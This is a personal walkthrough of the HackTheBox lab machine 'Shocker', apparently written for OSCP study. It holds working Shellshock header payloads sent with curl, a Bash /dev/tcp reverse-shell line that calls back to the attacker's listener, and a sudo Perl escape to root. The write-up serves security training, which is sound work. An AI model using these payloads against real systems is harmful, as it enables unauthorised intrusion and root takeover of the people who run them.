---
tags: [HTB, Shocker, Linux, Apache, CGI, Shellshock, CVE-2014-6271, Sudo, Perl, Easy]
platform: HackTheBox
os: Linux (Ubuntu 16.04)
hostname: Shocker
difficulty: Easy
ip: $BoxIP
status: Complete
domain: None
---

# HTB: Shocker, Full Walkthrough

## Gist

Shocker exposes Apache CGI execution through the directly reachable script /cgi-bin/user.sh. The script runs under Bash, so a crafted HTTP header reaches the Shellshock parser and executes commands as the low-privileged shelly account. A harmless identity proof confirms the vulnerability before the callback is sent. Local enumeration then shows that shelly can run /usr/bin/perl through sudo without a password, and Perl's inline evaluation replaces the process with Bash as root.

Attack chain:

Full TCP scan -> Apache and SSH on a non-standard port -> Gobuster finds /cgi-bin/user.sh -> Shellshock identity proof -> Bash callback as shelly -> NOPASSWD sudo Perl -> root.

## Box Information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Operating system | Ubuntu 16.04 |
| Hostname | Shocker |
| Domain | None |
| Difficulty | Easy |
| Target | $BoxIP |
| Working directory | $BoxDir |

## Vulnerability Summary

### Shellshock in CGI Bash execution

Apache mod_cgi passes selected HTTP headers into the CGI process environment. Vulnerable Bash versions interpret a function-style environment value and continue parsing commands appended after the function definition. The User-Agent header is a convenient delivery point, but the important evidence is that the CGI script executes the harmless id command.

### Passwordless sudo access to Perl

The shelly account is allowed to execute /usr/bin/perl through sudo without a password. Perl supports inline code with -e, and the exec function replaces the Perl process with a Bash process while retaining the sudo-acquired root identity.

## Evidence and Loot

The authoritative manual-run workspace is represented by $BoxDir. The vault contains:

- [[OSCP/BOXES/BOX LOGS/Shocker-redacted.log|Shocker-redacted.log]]: redacted command and output transcript with target and callback addresses replaced by variables.
- Private Nmap outputs under $BoxDir/nmap/: allports and services in normal, XML, and greppable formats.
- Private Gobuster output under $BoxDir/loot/: root and CGI enumeration results.
- Seven screenshots remain in the private source workspace; none are copied into the write-up vault.
- One source screenshot contains flag values and remains private with the rest of the screenshot evidence.
- Private flag records remain in $BoxDir/loot/flags.txt and are not reproduced here.

The useful findings recorded in the evidence are:

| Evidence | Result |
|---|---|
| Full TCP scan | HTTP on 80/tcp and SSH on 2222/tcp |
| Service scan | Apache httpd 2.4.18 and OpenSSH 7.2p2 |
| Root web enumeration | /server-status returned 403 |
| CGI enumeration | /cgi-bin/user.sh returned 200 |
| Shellshock proof | id executed as shelly |
| Local privilege check | shelly has NOPASSWD access to /usr/bin/perl |

## Variables

Use the workspace variables instead of hardcoding the target or callback addresses.

~~~bash
boxset BoxName Shocker
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir $BoxDir
boxset Domain ''
boxset Username shelly
boxset Port 4444
boxset WebPort 80
~~~

## Command-by-Command Walkthrough

### 1. Initialise the workspace and validate the active target

Why: the source transcript records an initial stale target address that produced filtered or unreachable results. A successful box workflow starts by confirming the address currently loaded in the workspace before interpreting scan results.

~~~bash
boxstart "$BoxName" "$BoxIP" htb
boxset LocalIP "$(ip addr show tun0 2>/dev/null | awk '/inet / {sub(/\/.*/,"",$2); print $2; exit}')"
ping -c 1 "$BoxIP"
~~~

Expected result: the active target responds and the local VPN address is available for the later callback. If every port appears filtered and ping also fails, check the loaded target address and VPN route before changing scan flags.

### 2. Discover every TCP port

Why: Shellshock is a web vulnerability, but the non-standard SSH port is easy to miss if only the default 1,000 ports are scanned. The full scan also creates the evidence file used by the service scan.

~~~bash
sudo nmap -Pn -n -p- --min-rate 2000 -T4 "$BoxIP" -oA "$BoxDir/nmap/allports"
~~~

If the local Nmap installation cannot create raw packets, use the TCP-connect fallback and lower rate:

~~~bash
sudo nmap -Pn -n -sT -p- --min-rate 500 "$BoxIP" -oA "$BoxDir/nmap/allports"
~~~

Expected result: 80/tcp is open for HTTP and 2222/tcp is open for SSH. The generic service label on 2222 is only a scan guess; confirm it during service detection.

### 3. Identify the services and versions

Why: service detection confirms that port 80 is Apache and that the second port is SSH. The Apache version and CGI behaviour justify a targeted web enumeration branch; the SSH port is retained as a possible alternate access path.

~~~bash
sudo nmap -Pn -n -sC -sV -p 80,2222 "$BoxIP" -oA "$BoxDir/nmap/services"
~~~

Expected result: Apache httpd 2.4.18 on Ubuntu at port 80 and OpenSSH 7.2p2 on port 2222.

### 4. Inspect the web root and enumerate content

Why: manual response review establishes the normal page shape, while directory enumeration identifies paths that are not linked from the landing page. A 403 response for the CGI directory is still useful because it confirms the directory exists; enumerate inside it rather than stopping there.

~~~bash
curl -si "http://$BoxIP/" | tee "$BoxDir/loot/index.headers.txt"
gobuster dir -u "http://$BoxIP/" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -o "$BoxDir/loot/gobuster-root.txt"
curl -si "http://$BoxIP/cgi-bin/"
gobuster dir -u "http://$BoxIP/cgi-bin/" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x sh,cgi,pl,py \
  -o "$BoxDir/loot/gobuster-cgi.txt"
~~~

Expected result: the root page is a small Apache response, /server-status is forbidden, and /cgi-bin/user.sh returns HTTP 200. The direct script path is the important discovery.

### 5. Prove Shellshock with a harmless command

Why: use an identity command before a reverse shell. This separates vulnerability confirmation from callback troubleshooting and proves the execution identity without changing the target.

~~~bash
curl -si "http://$BoxIP/cgi-bin/user.sh" \
  -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id'
~~~

Expected result: the HTTP response includes a uid line identifying the shelly account. The empty function body is only a parser trigger; the appended id command is the harmless proof.

### 6. Catch a Bash callback

Why: the listener must be ready before the CGI request launches the shell. The callback uses Bash's /dev/tcp feature, so it is appropriate only after the target-side interpreter has been established as Bash-compatible.

Terminal 1, on Kali:

~~~bash
nc -lvnp "$Port"
~~~

Terminal 2, on Kali:

~~~bash
curl -si "http://$BoxIP/cgi-bin/user.sh" \
  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LocalIP/$Port 0>&1"
~~~

The HTTP request may time out or return an incomplete response because the CGI process is now attached to the callback. The useful evidence is the connection in the listener and the remote prompt.

### 7. Stabilise the received shell

Why: a raw callback may not handle job control, keyboard editing, or full-screen output reliably. The manual run used the local terminal foreground sequence; use it carefully because stty changes the local terminal.

~~~bash
stty raw -echo
fg
~~~

Press Enter once after fg, then confirm the session:

~~~bash
id
whoami
hostname
pwd
~~~

Expected result: the shell is shelly on Shocker. If the local terminal is garbled after a failed attempt, run reset in the local terminal before continuing.

### 8. Enumerate the local privilege boundary

Why: sudo -l is a high-value manual check because it shows the exact command path and whether a password is required. Run it before spending time on kernel or SUID hunting.

~~~bash
sudo -n -l 2>/dev/null || sudo -l
~~~

Expected result: shelly can run /usr/bin/perl as root without a password.

### 9. Use the permitted Perl interpreter to become root

Why: sudo validates the approved interpreter path, while Perl's -e option evaluates inline code. exec replaces the Perl process with Bash, preserving the root identity granted by sudo.

~~~bash
sudo /usr/bin/perl -e 'exec "/bin/bash";'
id
whoami
hostname
~~~

Expected result: uid 0 and root are shown. Record this as the privilege proof before collecting completion evidence.

### 10. Record completion evidence without putting secret values in the vault

Why: flags are evidence, but their values belong in private loot rather than a shared methodology vault. The source workspace already records both flags privately.

~~~bash
ls -la /home/shelly/user.txt /root/root.txt
~~~

The manual run saved the flag values through the local loot helper. The vault records only that user and root completion were verified; it does not reproduce the values or embed source screenshots.

### 11. Close out the workspace

Why: this route does not require a target-side payload file or configuration change. Close the callback listener and shell, then mark the local workspace complete.

~~~bash
pkill -f "nc -lvnp $Port" 2>/dev/null || true
ss -ltnp | grep ":$Port" || true
boxdone
~~~

The supplied manual transcript records the flag collection but does not visibly include a boxdone line. No target-side payload file was recorded, so the target cleanup boundary is unchanged; record boxdone explicitly on the next replay.

## Gotchas 💡

1. A stale target address produced filtered results. Do not treat an all-filtered Nmap result as a vulnerability conclusion until ping, VPN state, and the active BoxIP have been checked.

2. A 403 response for /cgi-bin/ is not proof that CGI scripts are inaccessible. Enumerate direct files below the directory.

3. Use a harmless id proof before the callback. If id works but the shell does not connect, troubleshoot LocalIP, listener state, callback port, Bash availability, and quoting separately.

4. The HTTP request can hang after the callback starts. A timeout is expected when the CGI process stays attached to the reverse shell.

5. The listener port is not the web port. WebPort identifies Apache; Port identifies the Kali listener.

6. The manual shell was stabilised with stty raw -echo and fg. This modifies the local terminal, so keep reset ready.

7. Use the exact executable path shown by sudo -l. A generic sudo Perl command is not evidence that another Perl path or argument pattern is approved.

8. The root proof screenshot contains flag values. Keep all source screenshots in the private workspace; use the redacted log for vault evidence.

## Efficiency ⚡

- Validate the active target before changing Nmap options.
- Run the full TCP scan once, save all output with -oA, and carry only the open ports into the service scan.
- Review the root page manually, then run Gobuster against /cgi-bin/ when the directory itself is forbidden.
- Prove command execution with id before starting the listener.
- After the first shell, run sudo -l early. The exact Perl rule is a direct path to root.
- Keep the raw transcript, Nmap formats, Gobuster output, and screenshots in the box workspace so the walkthrough can be replayed.

## RUNBOOK V2 Stages Used

1. [[Start Here]]: initialise the workspace and run the full TCP scan.
2. [[Port Triage]]: classify the SSH plus HTTP service combination as a Linux route.
3. [[Linux - Service Scan]]: identify Apache and OpenSSH versions.
4. [[Linux - Web Enum]]: inspect the web root and enumerate the CGI path.
5. [[Linux - Shellshock CGI]]: prove the CGI header injection and deliver the callback.
6. [[Linux - RCE to Shell]]: catch the returned shell and separate listener troubleshooting from exploitation.
7. [[Linux - Shell Stabilise]]: recover a usable terminal.
8. [[Linux - Local Enum]]: establish identity and inspect local privilege paths.
9. [[Linux - Sudo Check]]: read the exact NOPASSWD Perl rule.
10. [[Linux - Clean Down]]: close sessions, confirm no temporary listener remains, and record the cleanup boundary.

## Attack Chain

| Stage | Finding | Consequence |
|---|---|---|
| Recon | HTTP and non-standard SSH were open | Apache became the first web-enumeration path |
| Web enum | /cgi-bin/user.sh returned 200 | Direct CGI script was available for testing |
| Foothold | Shellshock header executed id | Command execution as shelly |
| Shell | Bash callback reached Kali | Interactive low-privileged session |
| Local enum | NOPASSWD /usr/bin/perl | Perl inline execution was an escalation primitive |
| Privilege escalation | Perl exec launched Bash | Root shell and root completion proof |

## Credentials

| Account | Source | Use |
|---|---|---|
| shelly | Shellshock CGI execution identity | Initial shell |
| root | Perl sudo process identity | Final proof |

No password or hash is reproduced. This box did not require credential recovery for the verified route.

## Tools Used

- Nmap for complete TCP discovery and service/version identification.
- Curl for baseline requests, Shellshock proof, and callback delivery.
- Gobuster for root and direct CGI content discovery.
- Netcat for the callback listener.
- Sudo and Perl for the final interpreter-based privilege boundary.

## Flags

| Flag | Status | Private evidence |
|---|---|---|
| user.txt | Confirmed | $BoxDir/loot/flags.txt |
| root.txt | Confirmed | $BoxDir/loot/flags.txt |

## Key Lessons

- Always verify the target address when a scan unexpectedly shows only filtered or unreachable results.
- A forbidden directory can still contain directly reachable scripts.
- Shellshock testing should begin with a harmless response-channel command.
- A CGI callback request may stop producing a normal HTTP response once the shell is connected.
- Exact sudo path and argument review is faster and safer than broad privilege-escalation guessing.
- Keep completion values and sensitive screenshots in private loot, while the vault stores the reproducible technique.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]]: web command execution followed by local Linux privilege escalation.
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]]: web foothold followed by a sudo-based local route.
- [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]]: header-based command execution followed by an embedded interpreter sudo escape.
- [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]]: version-aware Linux service exploitation followed by a precise sudo boundary.

## External Resources

- [NVD: CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
- [Exploit-DB: Apache mod_cgi Shellshock](https://www.exploit-db.com/exploits/34900)
- [GTFOBins: Perl sudo](https://gtfobins.github.io/gtfobins/perl/#sudo)
- [RevShells](https://www.revshells.com/)
- [ippsec.rocks Shocker search](https://ippsec.rocks/?#Shocker)

## Checklist

- [x] Workspace variables recorded
- [x] Full TCP scan saved
- [x] Targeted service scan saved
- [x] Root web response saved
- [x] CGI path enumerated and saved
- [x] Shellshock identity proof captured
- [x] Callback shell captured
- [x] Shell stabilisation recorded
- [x] Sudo privilege proof captured
- [x] Root identity proof captured privately
- [x] User and root completion evidence saved privately
- [x] All screenshots excluded from the vault
- [x] No target-side payload file was recorded
- [x] Cleanup boundary documented
